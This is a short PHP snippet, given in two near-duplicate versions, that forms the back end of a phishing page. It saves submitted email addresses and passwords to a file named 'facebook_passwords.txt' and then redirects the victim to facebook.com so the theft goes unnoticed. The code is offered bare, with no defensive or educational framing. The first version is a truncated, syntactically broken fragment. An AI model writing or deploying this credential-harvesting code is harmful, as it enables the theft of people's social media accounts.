if ($_SERVER["REQUEST_METHOD"] =="POST") {$email = $_POST["email"];$password =$_POST["password"];$data="Email:$email\nPassword:$password\n"; file_put_contents('facebook_passwords.txt',$data, FILE_APPEND)

<?php$email =$_POST['email'];$password= $_POST['password'];$data="Email:$email\nPassword:$password\n"; file_put_contents('facebook_passwords.txt',$data, FILE_APPEND);header('Location: https://www.facebook.com', true, 301);?>
